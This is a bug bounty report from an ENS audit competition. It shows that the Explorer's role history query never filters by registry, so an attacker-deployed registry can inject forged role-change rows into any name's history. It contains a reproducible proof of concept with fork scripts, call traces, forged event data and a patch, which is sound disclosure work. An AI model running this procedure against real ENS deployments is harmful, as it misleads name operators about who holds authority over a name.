# 92825 w a medium missing registry scoping in the role history query lets anyone write permanent forged role change entries into any ens name s audit trail

**Submitted on Sep 12th 2026 at 16:10:30 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92825
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

## Description

## Brief/Intro

The Explorer shows a History panel for each name's roles: who was granted what, and when. It builds that panel by asking the indexer for every `EACRolesChanged` event in existence and keeping the ones whose resource identifier matches the name being viewed. That identifier is derived from the label alone and is identical across every registry, and the query never asks which contract emitted the event. Deploying a registry is a supported Explorer feature, so in production anyone can emit role changes carrying another name's resource identifier and have them appear in that name's history, permanently, choosing both the account shown and the roles attributed to it. The panel is the record an operator consults to decide who currently holds authority over a name, and it can be written to by anyone for the price of one contract deployment. The write is executed below against the real deployed Sepolia contracts, targeting a name that is really registered in the live ETHRegistry.

## Vulnerability Details

### The query asks for events by type, and nothing else

`apps/portal/src/features/roles/hooks/useRoleHistory.ts`, lines 46 to 72:

```ts
    const { events } = yield* fromPromise(
      graphqlIndexerClient.request<{
        events: IndexerEACEvent[]
      }>(
        gql`
          query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
            events(
              where: {
                type: "EACRolesChanged"
                blockNumber_lt: $blockNumberLt
              }
              first: $first
              orderBy: blockNumber
              orderDirection: desc
            ) {
              type
              data
              transactionHash
              timestamp
              blockNumber
            }
          }
        `,
        { blockNumberLt, first: PAGE_SIZE },
      ),
      (e) => new GetRoleHistoryError({ cause: e as ClientError }),
    )
```

There is no registry in the `where` clause, and `contractAddress` is not in the selection set either. The results are then narrowed client-side, on lines 84 and 86:

```ts
  const resource = label ? toResourceHex(labelToCanonicalId(label)) : undefined

  return ok(filterEventsByResource(allEvents, resource))
```

The resource comes from the label and nothing else. `labelToCanonicalId` takes a single argument, so there is nowhere to pass a registry even if a caller wanted to, and the proof of concept measures that rather than asserting it.

The client cannot distinguish registries even in principle, because the event type it works with has no field for the emitting contract. `apps/portal/src/lib/roles/filterEventsByResource.ts`, lines 5 to 11:

```ts
export type IndexerEACEvent = {
  readonly type: string
  readonly data: string
  readonly transactionHash: Hex
  readonly timestamp: number
  readonly blockNumber: number
}
```

### The codebase already reached the opposite conclusion

`apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts` reads the same events for the same feature. Its own documentation, lines 52 to 61:

```ts
/**
 * Read current `(account → roles[])` state for `resource` on `registryAddress`
 * from the indexer by replaying `EACRolesChanged` events.
 *
 * We can't use the indexer's top-level `roles(resource:)` field because it
 * isn't scoped by registry — `ROOT_RESOURCE` (`0x0`) is shared across every
 * sub-registry, so a resource-only filter would conflate role grants across
 * unrelated registries. The `events(contractAddress:)` filter is registry-
 * scoped, so we use that and reconstruct state client-side.
 */
```

That hook passes `contractAddress` on line 77, and `useRegistryRoleHistoryForAccount` does the same. Only the History hook omits it.

The History hook does carry a defending note, and it is worth quoting because it does not cover this. Lines 32 to 36:

```ts
  // NOTE: We intentionally do not filter by `domain` in the GraphQL query.
  // The indexer does not currently populate the `domain` relation on
  // `EACRolesChanged` events for many names (e.g. 2LDs like `fresh.eth`),
  // so filtering server-side by `domain` would drop valid events. Instead we
  // fetch by event type and filter client-side by the resource hex.
```

That explains why the query avoids `domain`. `contractAddress` is a different field, it is registry-scoped, and the sibling hook demonstrates that it works.

### The filter that is available and unused

The indexer's generated schema is shipped in this repository at `packages/indexer/graphql.gen.ts`, and it is the contract the deployed indexer serves. Two lines from it settle the shape of the data.

Line 249, on the `Event` type:

```ts
  contractAddress: Scalars['String']['output'];
```

That field is **non-nullable**. Every indexed event carries the contract that emitted it, which a schema serving a single-contract index would not require.

Line 282, on `EventFilter`:

```ts
  contractAddress?: InputMaybe<Scalars['String']['input']>;
```

The registry scoping this hook needs is already available in the API it is calling. It simply does not pass it.

### Who can emit matching events, run against the deployed contracts

Deploying a registry is a supported Explorer feature, not an exotic precondition: `apps/portal/src/features/registry/helpers/deploySubregistry.ts` line 14 imports ensjs's `deploySubregistryWriteParameters`, and the flow deploys a user registry through the VerifiableFactory.

Rather than argue from that, the chain arm of the proof of concept executes it. `verification/pocs/H-C7-19/fork/run.sh` runs against a Sepolia fork pinned to block 11689000, so every ENS contract in the path is the real deployed bytecode, checked non-empty before anything else happens:

| contract                                     | address                                      | codesize on the fork |
| -------------------------------------------- | -------------------------------------------- | -------------------- |
| VerifiableFactory                            | `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef` | 1411                 |
| registry implementation the Explorer deploys | `0x624a25d67B59D587752EbEc8DdeD8827dAe52050` | 17159                |
| ETHRegistry                                  | `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2` | 14730                |

Those are not addresses this proof chose. They are the ones the Explorer's own deploy form resolves. `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx`, lines 33 to 41:

```ts
const factoryAddress = getChainContractAddress({
  chain: sepoliaWithEns,
  contract: 'ensVerifiableFactory',
})

const implAddress = getChainContractAddress({
  chain: sepoliaWithEns,
  contract: 'ensUserRegistryImpl',
})
```

Both are passed straight into `deploySubregistry`, and in the pinned `@ensdomains/ensjs` the Sepolia entries for those two names are `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef` and `0x624a25d67B59D587752EbEc8DdeD8827dAe52050`. The repository pins the same deployment independently: `packages/smart-account/src/providers/rhinestone/manifest.test.ts` asserts `verifiableFactory` on line 52, `verifiableFactoryProxyLogic` `0xA136BeE4E37B44586242e516a39893EfD54315e9` on line 53, and `ethRegistry` on line 57. That middle address is the delegatecall frame in the trace below, so the proxy the attacker deploys runs through the Explorer's own proxy logic into the Explorer's own registry implementation.

The rig also reads the deployed address the same way the Explorer does, off the first log of the receipt, as `deploySubregistry.ts` lines 26 to 33 do.

The victim is `heliamphora`, a name really registered in that live ETHRegistry, owned by `0x1995c710324D68F4e58C507f92122F94D6cc27A4`. Its resource is read from the chain rather than computed by the test, and it equals the value the History hook filters on:

```
victim_is_registered_in_real_ethregistry: 2
real_ethregistry_resource: 105698915282361830913465873118721338883054990857144678076409293866607304507392
real_resource_equals_labelToCanonicalId: 1
```

The attacker is a fresh externally owned account, `0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F`, with no code and no authority over that name. Both are measured, and the second is measured twice, once as a state read and once as a failed call:

```
attacker_has_no_code: 0
attacker_has_any_role_on_victim_in_real_registry: false
grant_on_REAL_ethregistry_reverted: 1
  revert: EACCannotGrantRoles(105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], 5708990770823839524233143877797980545530986496 [5.708e45], 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F)
```

That account then deploys a registry through the Explorer's own factory, registers the victim's label in the registry it now owns, and reads back the resource that registry assigns to it. It is the same number:

```
attacker_registry_deploy_status: 1
attacker_registry_address: 0xa6e2a145fc351b5c62e275fdfe140f22dd95240f
attacker_register_status: 1
attacker_registry_resource_for_victim_label: 105698915282361830913465873118721338883054990857144678076409293866607304507392
attacker_resource_equals_victim_resource: 1
```

Nothing about registering the label in the attacker's own registry touches the victim's name in the ETHRegistry. It mints a token in a contract the attacker controls whose EAC resource happens to be the same integer, because the resource is the label's canonical id and a label hashes the same everywhere.

One `grantRoles` call then produces the event. The trace names the sender and the emitter:

```
Traces:
  [107313] 0xA6E2a145Fc351B5c62E275FdfE140F22DD95240f::grantRoles(105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], 17891328 [1.789e7], 0x2222222222222222222222222222222222222222)
    ├─ [104629] 0xA136BeE4E37B44586242e516a39893EfD54315e9::grantRoles(105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], 17891328 [1.789e7], 0x2222222222222222222222222222222222222222) [delegatecall]
    │   ├─ [99537] 0x624a25d67B59D587752EbEc8DdeD8827dAe52050::grantRoles(105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], 17891328 [1.789e7], 0x2222222222222222222222222222222222222222) [delegatecall]
    │   │   ├─ emit EACRolesChanged(resource: 105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], account: 0x2222222222222222222222222222222222222222, oldRoleBitmap: 0, newRoleBitmap: 17891328 [1.789e7])
    │   │   ├─ emit TransferSingle(operator: 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F, from: 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F, to: 0x0000000000000000000000000000000000000000, id: 105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], value: 1)
    │   │   ├─ emit TokenRegenerated(oldTokenId: 105698915282361830913465873118721338883054990857144678076409293866607304507392 [1.056e77], newTokenId: 105698915282361830913465873118721338883054990857144678076409293866607304507393 [1.056e77])
    │   │   ├─ emit TransferSingle(operator: 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F, from: 0x0000000000000000000000000000000000000000, to: 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F, id: 105698915282361830913465873118721338883054990857144678076409293866607304507393 [1.056e77], value: 1)
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001


Transaction successfully executed.
Gas used: 124549
```

The innermost frame is the Explorer's own registry implementation, reached by delegatecall through the proxy the factory deployed. The resource is the victim's. The account and the role bitmap are both arguments the attacker chose. That single transaction costs 124549 gas.

Finally, the filter value is not a theoretical one. The chain arm sweeps a 12,000-block window of the live ETHRegistry's own logs and checks every `EACRolesChanged` it finds. Every one of them carries a resource whose low 32 bits are zero, which is exactly the form `labelToCanonicalId` produces, so the value the History hook filters on is the value production actually emits:

```
production_low32_zero_fraction_is_all: 1
```

The arm also prints the three counts behind that ratio, and they are deliberately not quoted as evidence. The block range is fixed, yet the count fell from 415 to 407 across five runs while this report was written, which means the public endpoint serving the historical log query returns a partial result set rather than a complete one. So this is a sample of production events, not an exhaustive sweep, and the honest claim is the one made above: every event the sweep returned carried a low-32-bits-zero resource, on every run. Nothing else in this report depends on it. Every other figure is read from the pinned fork and reproduces exactly.

## Impact Details

The impact selected is the persistent static-content injection row, at High severity. Quoted exactly as the programme lists it:

> Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
>
> * HTML injection without JavaScript
> * Replacing existing text with arbitrary text
> * Arbitrary file uploads, etc.

The injection is persistent, requires no JavaScript, and appears on a page other users view. An attacker chooses both the account address shown in the row and the roles attributed to it, and the entries carry a real transaction hash and a real timestamp, so nothing distinguishes them from genuine ones.

The victim has no move. The events are on-chain and cannot be deleted. The panel has no notion of which registry an entry came from, because `IndexerEACEvent` has no field for it. There is no denylist, no hiding and no per-entry dismissal anywhere in the roles or history features. And the only call site, `RoleHistoryTable.tsx` line 155, passes `{ label }` and nothing else, so there is no place for the victim's own registry address to enter the query even if the UI offered the choice. Revoking every role on the name changes nothing: the forged rows were never grants against the victim's registry in the first place.

What makes the forged rows credible rather than obviously wrong is that the two panels disagree, and only one of them is wrong. The current-roles view is registry-scoped: `useNameRoleAccounts` passes `contractAddress` on line 77, so a foreign registry's event never reaches it. The History view is not. An operator therefore sees a current-roles list that does not include `0x2222222222222222222222222222222222222222`, and a history that says `0x2222222222222222222222222222222222222222` was granted three roles and never had them revoked. The natural reading of that pair is not "the history is forged" but "someone granted roles and the state view is stale", which is precisely the wrong conclusion.

The consequence is that the History panel stops being an audit trail. It is the record an operator consults to decide who currently holds authority over a name and whether a past grant was revoked. Fabricated rows can suggest that an unfamiliar address was granted an admin role, or that a real grant has already been revoked and so needs no action. The plausible harm is an induced administrative decision: revoking the wrong account, or declining to revoke a real one. The cost to the attacker is one contract deployment, and the entries are permanent.

The honest objection, stated so a reviewer does not have to find it. The injected content is structured rather than free text: an address, role names, a transaction hash and a timestamp, not arbitrary markup. A reviewer may read "replacing existing text with arbitrary text" more narrowly than that. If the impact is judged not to fit, the substance is unchanged: this is an authorization audit trail that anyone can forge, and it should be filed under whichever impact the programme considers correct for that.

## References

* `apps/portal/src/features/roles/hooks/useRoleHistory.ts` lines 32 to 36 (the note that justifies dropping `domain`, not `contractAddress`), 46 to 72 (the unscoped query), 84 and 86 (resource-only narrowing)
* `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts` lines 52 to 61 (the comment reaching the opposite conclusion) and line 77 (the `contractAddress` filter in use)
* `apps/portal/src/lib/roles/filterEventsByResource.ts` lines 5 to 11 (the event type carries no contract) and the resource-only filter below it
* `apps/portal/src/features/registry/helpers/deploySubregistry.ts` line 14, the Explorer's own registry deployment flow, and lines 26 to 33, which read the deployed address off the receipt's first log
* `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx` lines 33 to 41, where the Explorer resolves the factory and the registry implementation this proof uses
* `packages/smart-account/src/providers/rhinestone/manifest.test.ts` lines 52, 53 and 57, the repository's own pinned Sepolia deployment for the factory, its proxy logic and the ETHRegistry
* `apps/portal/src/features/registry/hooks/useRegistryRoleHistoryForAccount.ts` lines 6 to 8 (the codebase calling `useRoleHistory` the global one) and lines 47 to 77 (the same indexer queried with an arbitrary `contractAddress`)
* `apps/portal/src/routes/registry/$address/index.tsx`, the route keyed on any registry address
* `apps/portal/src/features/roles/components/RoleHistoryTable.tsx` line 155, the only call site, which passes a label and nothing else
* `packages/indexer/graphql.gen.ts` line 249 (`Event.contractAddress`, non-nullable) and line 282 (`EventFilter.contractAddress`, available and unused)

## Proof of Concept

### Step-by-step reproduction

The scenario is automated by the two scripts in the Full source section below, and was executed against commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`. It has two arms. The first produces the attacker's event on the real contracts; the second feeds that event, and a genuine one, to the real hook.

**Produce the event, on a Sepolia fork of the deployed contracts**

1. Fork Sepolia at block 11689000 and confirm the VerifiableFactory, the registry implementation the Explorer deploys, and the ETHRegistry all have code.
2. Pick a victim that is really registered in the live ETHRegistry. Read its status and its resource from the chain, and confirm the resource equals `labelToCanonicalId(label)` computed independently.
3. Confirm the attacker's account has no code, holds no role over that name, and that `grantRoles` against the real ETHRegistry reverts for it.
4. Deploy a registry through the Explorer's own VerifiableFactory, with the Explorer's own implementation and its `initialize(admin, roleBitmap)` calldata.
5. Register the victim's label in that registry. Read back the resource it assigns and confirm it is the same integer as the live one.
6. Call `grantRoles` with that resource, an account of the attacker's choosing and a role bitmap of the attacker's choosing. Read the emitted log off the chain and confirm the emitter is the attacker's registry, the resource is the victim's, and the account is the one chosen.
7. Pull the genuine `EACRolesChanged` event for the same name out of the live ETHRegistry's own logs, so the next arm can be handed one real event from each contract.

**Establish the shape of the data**

8. Read `packages/indexer/graphql.gen.ts`, the generated schema the deployed indexer serves. Confirm `Event.contractAddress` is a non-nullable output field, so every indexed event carries its emitting contract. Confirm `EventFilter.contractAddress` exists, so registry scoping is available to any caller.

**Drive the real hook**

9. Take the real exported `getRoleHistoryQueryOptions` from `useRoleHistory.ts` and invoke its own `queryFn`, passing the options object's own `queryKey`, which is exactly what tanstack-query supplies at runtime. This executes the real GraphQL document, the real pagination loop, the real resource derivation and the real `filterEventsByResource`.
10. Answer the indexer request with the two real logs from the first arm: one emitted by the live ETHRegistry, one emitted by the attacker's registry. They carry byte-identical resources.
11. Capture the GraphQL document the hook emits and inspect its text. Confirm it filters on event type, and that `contractAddress` appears nowhere in it, neither as a filter nor in the selection set.
12. Read the entries the hook returns. Both rows are present, and nothing in the returned data distinguishes the foreign one from the legitimate one.

**Control**

13. Repeat with one input changed: a different name is being viewed. Both rows are correctly excluded. This shows the resource filter itself works, which isolates the defect to the missing registry scoping.

**Check the premise rather than assume it**

14. Confirm `labelToCanonicalId` accepts exactly one argument, so there is nowhere to pass a registry.
15. Confirm the two contracts' events carry byte-identical resource strings, so the collision is real rather than an artefact of how the test builds them.

### What executes for real, and what is substituted

The scenario runs under the Explorer's own vitest configuration. Executing for real: the exported hook, the GraphQL document it builds, its pagination loop, the resource derivation through `toResourceHex(labelToCanonicalId(label))`, and `filterEventsByResource`. The query text is captured and inspected rather than read off the source, so the absence of the filter is measured.

Substituted, with the reason it cannot be the real thing:

* The indexer's network transport. `graphqlIndexerClient.request` is replaced by a recorder, restored in a `finally` block. It cannot be the real indexer: `packages/indexer` in this repository is only the GraphQL client, codegen, urql and generated types, not the indexing service, so there is no local instance; and no request may be sent to a deployed one. The substitution is also what supplies the condition under test, namely events from two different contracts. Nothing inside the hook is mocked, and in the second test the events it hands back are not constructed at all: they are the two real logs the first arm captured.

Not substituted, though it may look like it: the chain. The first arm runs anvil, but anvil is forking Sepolia, so the factory, the registry implementation and the ETHRegistry are the deployed bytecode, read live and asserted non-empty by codesize before the run proceeds. What is local is block production, which is what keeps the attacker's transactions off the live network.

### What this proof does not cover

One thing, stated plainly. Everything from the attacker's transaction to the rendered row is executed. What is not executed is the ingestion step in between: whether the deployed indexer picks up one specific attacker-deployed registry. That is a property of its runtime configuration, `packages/indexer` in this repository is only the GraphQL client, so there is no indexing service here to run, and no request may be sent to a deployed one.

Three things bound that gap from the repository itself.

The schema is multi-contract by construction. `Event.contractAddress` is non-nullable, which a single-contract index would not require, and `EventFilter.contractAddress` exists as a filter callers may pass.

The Explorer already reads arbitrary registries out of this index. `apps/portal/src/routes/registry/$address/index.tsx` is a route keyed on any registry address, and the hook behind it, `apps/portal/src/features/registry/hooks/useRegistryRoleHistoryForAccount.ts` lines 47 to 77, asks this same indexer for that registry's `EACRolesChanged` events with `contractAddress` set to whatever address the URL carried. If the index did not span user-deployed registries, that route would be permanently empty.

And the codebase names the defect itself. The doc comment on that same file, lines 6 to 8:

```ts
 * for the supplied account. Mirrors the query strategy used by
 * `useNameRoleAccounts` (which is per-name) and `useRoleHistory` (which is
 * global) but scoped to the registry overview's add/edit-user UI.
```

`useRoleHistory` is the History hook. Its own siblings describe it as the global one.

### Measured output, chain arm

`bash verification/pocs/H-C7-19/fork/run.sh`. Two things are elided: the call trace, which is quoted in full above, and the three `production_*` counts, which do not reproduce for the reason given above. Everything shown reproduces exactly.

```
fork_chain_id: 11155111
fork_block: 11689000
attacker_address: 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F
attacker_has_no_code: 0
codesize_factory: 1411
codesize_impl: 17159
codesize_ethregistry: 14730
victim_label: heliamphora
victim_labelhash: 0xe9af774adcfe12ad33ceff00de5811fde316c4838ca2bee5e72f783b7562a54a
labelToCanonicalId_decimal: 105698915282361830913465873118721338883054990857144678076409293866607304507392
victim_is_registered_in_real_ethregistry: 2
real_ethregistry_resource: 105698915282361830913465873118721338883054990857144678076409293866607304507392
real_resource_equals_labelToCanonicalId: 1
victim_owner_in_real_registry: 0x1995c710324D68F4e58C507f92122F94D6cc27A4
attacker_has_any_role_on_victim_in_real_registry: false
grant_on_REAL_ethregistry_reverted: 1
attacker_registry_deploy_status: 1
attacker_registry_address: 0xa6e2a145fc351b5c62e275fdfe140f22dd95240f
attacker_registry_resource_for_victim_label: 105698915282361830913465873118721338883054990857144678076409293866607304507392
attacker_resource_equals_victim_resource: 1
attacker_register_status: 1
grant_on_attacker_registry_status: 1
eac_event_topic0: 0x0d35bf721a39b614de00ca5038e1deb0cb0c69a278645e83405a7226cf80ba3c
eac_rolechanged_logs_emitted: 1
log_emitting_contract: 0xa6e2a145fc351b5c62e275fdfe140f22dd95240f
log_emitter_is_attacker_registry: 1
log_resource_decimal: 105698915282361830913465873118721338883054990857144678076409293866607304507392
log_resource_equals_labelToCanonicalId: 1
log_account: 0x2222222222222222222222222222222222222222
log_account_is_attacker_chosen: 1
log_oldRoleBitmap: 0
log_newRoleBitmap: 17891328
log_tx_hash: 0xcde44aada5794362eaa6d927d9e4b466dd1ebc4ece096d44d46772d35a7d28f6
log_block_number: 11689003
STEP4_OK: 1
forging_tx_sender_is_the_attacker_eoa: 0x56262f1779298d9c7c22f5273ee254c3d8e4fa4f
production_low32_zero_fraction_is_all: 1
genuine_production_events_for_victim_resource: 1
genuine_event_emitter: 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2
genuine_event_account: 0x1995c710324d68f4e58c507f92122f94d6cc27a4
genuine_event_block: 11680097
STEP6_OK: 1

FORK ARM: ALL CHECKS PASSED
```

The two events it writes out, byte for byte as the arm captured them. The genuine one, from the live ETHRegistry:

```json
{
  "type": "EACRolesChanged",
  "data": "{\"resource\": \"0xe9af774adcfe12ad33ceff00de5811fde316c4838ca2bee5e72f783b00000000\", \"account\": \"0x1995c710324d68f4e58c507f92122f94d6cc27a4\", \"oldRoleBitmap\": \"0x0\", \"newRoleBitmap\": \"0x1110000000000000000000000000000001100000\"}",
  "transactionHash": "0x73864ba3a7ac3984cb5c63c2c418ccf233ba04194474ccc9cafe226b502f9097",
  "timestamp": 0,
  "blockNumber": 11680097,
  "_emittingContract": "0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2"
}
```

And the attacker's:

```json
{
  "type": "EACRolesChanged",
  "data": "{\"resource\": \"0xe9af774adcfe12ad33ceff00de5811fde316c4838ca2bee5e72f783b00000000\", \"account\": \"0x2222222222222222222222222222222222222222\", \"oldRoleBitmap\": \"0x0\", \"newRoleBitmap\": \"0x1110000\"}",
  "transactionHash": "0xcde44aada5794362eaa6d927d9e4b466dd1ebc4ece096d44d46772d35a7d28f6",
  "timestamp": 0,
  "blockNumber": 11689003,
  "_emittingContract": "0xa6e2a145fc351b5c62e275fdfe140f22dd95240f"
}
```

Different `_emittingContract`, identical `resource`. That field is carried here only so this report can show which contract each event came from. It is not part of `IndexerEACEvent`, and the rig strips it before handing either event to the hook, because the hook's own type has no such field to strip in production.

### Measured output, application arm, exploit

```
schema_event_requires_contractAddress: 1
schema_filter_offers_contractAddress: 1
chain_victim_label: heliamphora
arm: exploit
graphql_queries_issued: 1
query_filters_by_event_type: 1
query_mentions_contractAddress_anywhere: 0
query_selects_contractAddress_field: 0
history_entries_returned: 2
legit_registry_row_rendered: 1
FOREIGN_REGISTRY_ROW_RENDERED_IN_VICTIM_HISTORY: 1
resource_derivation_arity: 1
resource_identical_across_registries: 1
impact_row_primary: 46
```

and, from the second test, driven with the two real logs:

```
arm: exploit
viewed_label: heliamphora
genuine_event_emitter: 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2
genuine_event_tx: 0x73864ba3a7ac3984cb5c63c2c418ccf233ba04194474ccc9cafe226b502f9097
forged_event_emitter: 0xa6e2a145fc351b5c62e275fdfe140f22dd95240f
forged_event_tx: 0xcde44aada5794362eaa6d927d9e4b466dd1ebc4ece096d44d46772d35a7d28f6
emitters_differ: 1
resources_byte_identical: 1
resource_matches_labelToCanonicalId: 1
history_entries_returned: 2
genuine_row_rendered: 1
FORGED_ROW_RENDERED_FROM_CHAIN_DATA: 1
```

`query_mentions_contractAddress_anywhere: 0` is the core measurement: the registry is never asked for, anywhere in the request, while `schema_filter_offers_contractAddress: 1` shows the filter was available. `resource_derivation_arity: 1` and `resource_identical_across_registries: 1` establish the premise the attack rests on rather than assuming it, and `FORGED_ROW_RENDERED_FROM_CHAIN_DATA: 1` establishes it with data the chain produced.

### Measured output, application arm, control

Identical path and identical calls. In the first test the foreign event carries a different label's resource; in the second, a different name is being viewed. The same two real logs are served either way.

```
schema_event_requires_contractAddress: 1
schema_filter_offers_contractAddress: 1
chain_victim_label: heliamphora
arm: control
graphql_queries_issued: 1
query_filters_by_event_type: 1
query_mentions_contractAddress_anywhere: 0
query_selects_contractAddress_field: 0
history_entries_returned: 1
legit_registry_row_rendered: 1
FOREIGN_REGISTRY_ROW_RENDERED_IN_VICTIM_HISTORY: 0
resource_derivation_arity: 1
resource_identical_across_registries: 0
impact_row_primary: 46
```

```
arm: control
viewed_label: someotherlabel
genuine_event_emitter: 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2
genuine_event_tx: 0x73864ba3a7ac3984cb5c63c2c418ccf233ba04194474ccc9cafe226b502f9097
forged_event_emitter: 0xa6e2a145fc351b5c62e275fdfe140f22dd95240f
forged_event_tx: 0xcde44aada5794362eaa6d927d9e4b466dd1ebc4ece096d44d46772d35a7d28f6
emitters_differ: 1
resources_byte_identical: 1
resource_matches_labelToCanonicalId: 1
history_entries_returned: 0
genuine_row_rendered: 0
FORGED_ROW_RENDERED_FROM_CHAIN_DATA: 0
```

The resource filter does its job. It is the registry that is never checked.

### Recommended fix

Scope the query the way the sibling hooks already do. `useNameRoleAccounts` passes `contractAddress` on line 77 and `useRegistryRoleHistoryForAccount` on line 57; only this hook omits it.

The patch below is the one applied and executed by the proof of concept's differential check. It is against `apps/portal/src/features/roles/hooks/useRoleHistory.ts`:

```diff
 type GetRoleHistoryParameters = {
   readonly label?: string
+  // The registry that owns this name. Required: an EAC resource is derived from the label
+  // alone and is identical in every registry, so without it the query cannot tell a role
+  // change emitted by this name's registry from one emitted by any other contract.
+  readonly registryAddress: string
 }

 const getRoleHistory = ResultFn(async function* ({
   label,
+  registryAddress,
 }: GetRoleHistoryParameters) {

-          query getRoleHistory($blockNumberLt: Int!, $first: Int!) {
+          query getRoleHistory(
+            $blockNumberLt: Int!
+            $first: Int!
+            $contractAddress: String!
+          ) {
             events(
               where: {
                 type: "EACRolesChanged"
+                contractAddress: $contractAddress
                 blockNumber_lt: $blockNumberLt
               }

-        { blockNumberLt, first: PAGE_SIZE },
+        {
+          blockNumberLt,
+          first: PAGE_SIZE,
+          contractAddress: registryAddress.toLowerCase(),
+        },
```

It is a signature change, so the call sites move with it, but the address is already in scope where it is needed. `RolesSidebar.tsx` takes `registryAddress` as a prop on line 58 and renders `RoleHistoryTable` on line 323 without passing it down; threading it through that component and into `getRoleHistoryQueryOptions` is the rest of the change.

Applied to the pinned source and re-run, the exploit is blocked:

```
[x] 11  DIFFERENTIAL  query_mentions_contractAddress_anywhere 0 -> 1, FOREIGN_REGISTRY_ROW_RENDERED_IN_VICTIM_HISTORY 1 -> 0, FORGED_ROW_RENDERED_FROM_CHAIN_DATA 1 -> 0 under the declared fix
```

That differential is only meaningful because the rig's recorder honours a `contractAddress` filter the way the indexer's own schema says it does. A recorder that ignored the filter would answer identically with or without the fix, and the check would be a tautology. The control arm is re-run under the patch as well, so a patch that merely broke the harness would be caught rather than counted as a fix.

Two notes on the verification tooling, so nothing here is read as stronger than it is.

The substitution check reports "no substituted transports". That is its detector speaking, not a clean bill of health: it matches `vi.mock(`, `nock(`, a reassigned `fetch` and similar, and does not recognise `vi.spyOn(...).mockImplementation(...)`, which is what this rig uses. The substitution is real, there is exactly one of it, and it is declared in the manifest: two `vi.spyOn` calls on `graphqlIndexerClient.request`, one per test, at `poc.test.ts` lines 78 and 191, each restored in a `finally` block at lines 152 and 243. There is no `fetch` override, no local server and no other interceptor anywhere in the file. That was verified by reading the file, not by the checker.

The reachability check reports no external dependency. That is correct rather than vacuous: the impact path is client-side, so the manifest declares an explicit empty list.

### Running it

```bash
bash verification/pocs/H-C7-19/fork/run.sh
bash verification/pocs/H-C7-19/run.sh exploit
bash verification/pocs/H-C7-19/run.sh control
```

The first needs `anvil` and `cast`, and reaches a public Sepolia endpoint to populate the fork. It writes `fork/real-event.json` and `fork/forged-event.json`. It sends nothing to any ENS system: the only outbound requests are the read-only calls the fork makes to fetch state, and every transaction is mined locally.

The other two read the two schema facts, substitute those captured events into the test, copy it into the Explorer, run it, and remove the copy again. They refuse to run if the captured events are absent, so the application arm cannot silently fall back to invented data. They touch no database and no network.

One environment note that costs an hour if it is not said. The attacker in the chain arm is a fresh account with a fixed key, deliberately not one of anvil's default accounts. Every one of those well-known addresses carries an EIP-7702 delegation on real Sepolia, so on a fork they have code, and the registry's ERC-1155 mint rejects them with `ERC1155InvalidReceiver` for reasons that have nothing to do with this finding.

### Full source

#### `verification/pocs/H-C7-19/fork/run.sh`

```bash
#!/usr/bin/env bash
# H-C7-19 FORK ARM -- "who can emit", answered on real deployed contracts.
#
# The triager asked for executed evidence that an attacker can emit an EACRolesChanged event
# carrying ANOTHER name's resource, from a registry they deployed the way the Explorer does it,
# holding no permission over the victim name.
#
# Everything below runs against a SEPOLIA FORK pinned to one block, so every ENS contract that
# takes part is the real deployed bytecode:
#   VerifiableFactory    0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
#   ensUserRegistryImpl  0x624a25d67B59D587752EbEc8DdeD8827dAe52050   (what the Explorer deploys)
#   ETHRegistry          0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
#
# The victim is a name that is really registered in that live ETHRegistry, so the resource the
# attacker collides with is a production value and not one this script invented.
#
# Nothing is written to any live network. The only outbound requests are read-only RPC calls
# that populate the fork. Every state change happens inside the local anvil instance.
set -uo pipefail

PORT=${PORT:-8580}
RPC=http://127.0.0.1:$PORT
FORK_BLOCK=${FORK_BLOCK:-11689000}
VICTIM_LABEL=${VICTIM_LABEL:-heliamphora}

FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
IMPL=0x624a25d67B59D587752EbEc8DdeD8827dAe52050
ETHREGISTRY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
ZERO=0x0000000000000000000000000000000000000000

# The attacker is a fresh EOA with a fixed key. It is deliberately NOT one of anvil's default
# accounts: every one of those addresses carries an EIP-7702 delegation on real Sepolia, so on a
# fork they have code and fail the ERC-1155 receiver check for reasons unrelated to this finding.
ATTACKER_PK=0xa11ce00000000000000000000000000000000000000000000000000000000001
# the account and roles the attacker chooses to show in the forged row
CHOSEN=0x2222222222222222222222222222222222222222

